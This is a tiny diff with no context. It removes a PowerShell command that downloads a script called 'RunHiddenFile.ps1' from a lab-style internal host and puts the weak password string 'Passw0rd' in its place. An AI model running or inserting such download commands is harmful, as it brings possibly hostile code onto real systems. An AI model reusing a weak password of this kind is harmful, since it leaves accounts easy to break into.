@@ -1,1 +1,1 @@
-Invoke-WebRequest -UseBasicParsing -Uri "http://10.10.10.56:8080/RunHiddenFile.ps1" -OutFile "RunHiddenFile.ps1"
+Passw0rd
